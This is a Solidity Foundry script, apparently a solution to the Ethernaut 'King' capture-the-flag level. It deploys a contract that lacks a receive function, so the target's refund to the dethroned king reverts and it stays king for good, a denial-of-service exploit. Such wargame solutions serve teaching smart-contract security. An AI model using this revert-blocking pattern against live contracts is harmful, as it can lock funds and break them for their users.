// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/King.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

/*
    The contract below represents a very simple game:
    whoever sends it an amount of ether that is larger than the current prize becomes the new king.
    On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process!
    As ponzi as it gets xD

    Such a fun game. Your goal is to break it.

    When you submit the instance back to the level, the level is going to reclaim kingship.
    You will beat the level if you can avoid such a self proclamation.

    Solution: Denial of Service Attack
    Become the king with a contract that doesn't have a receive function
    This will revert when the King contract makes a new king

 */
contract TheLastKing {
    constructor(King _kingInstance) payable {
        (bool result,) = address(_kingInstance).call{value: _kingInstance.prize()}("");
        require(result);
    }
}

contract KingSolution is Script {

    King public kingInstance = King(payable(0xD795AF0D08F3a425384A7D9e9f60E225DD350DB6));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new TheLastKing{value: kingInstance.prize()}(kingInstance);
        vm.stopBroadcast();
    }
}